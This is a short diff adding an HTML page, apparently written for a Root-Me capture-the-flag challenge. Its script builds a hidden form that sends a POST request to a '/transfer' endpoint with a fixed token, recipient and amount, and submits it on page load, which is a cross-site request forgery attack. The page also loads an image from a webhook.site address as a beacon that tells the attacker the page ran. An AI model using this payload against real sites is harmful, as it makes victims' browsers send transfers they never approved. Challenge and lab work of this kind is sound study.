@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html><body>
+<script>
+var BASE = "https://instance-019fb223-5d44-71cf-beca-e7b82532906b.challenges.root-me.pro";
+var f = document.createElement("form");
+f.action = BASE + "/transfer";
+f.method = "POST";
+f.innerHTML = '<input name="token" value="6a6b0d06cb6fa054000000">' +
+              '<input name="recipient" value="fresh_1785400542">' +
+              '<input name="amount" value="5">';
+document.body.appendChild(f);
+f.submit();
+
+var img = document.createElement("img");
+img.src = "https://webhook.site/f5af0355-1e19-423e-8665-14603d26667f?beacon=selftest2";
+document.body.appendChild(img);
+</script>
+</body></html>
